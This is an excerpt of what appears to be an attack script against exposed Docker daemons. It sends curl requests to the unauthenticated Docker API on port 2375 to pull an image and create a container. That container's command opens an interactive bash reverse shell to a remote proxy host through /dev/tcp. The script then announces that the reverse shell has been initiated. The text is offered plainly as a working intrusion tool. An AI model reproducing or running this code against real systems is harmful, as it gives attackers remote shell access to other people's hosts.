...
curl -s -X POST "http://$DOCKER_IP:2375/images/create?fromImage=ubuntu&tag=20.04" > /dev/null

# Create container with reverse shell to $PROXY_HOST:$PROXY_PORT
...
-d "{
  ...
  \"Cmd\": [\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/$PROXY_HOST/$PROXY_PORT 0>&1 || tail -f /dev/null\"]
}")
...
echo "[+] Reverse shell initiated. If the reverse shell fails, the container will stay active until manually stopped."
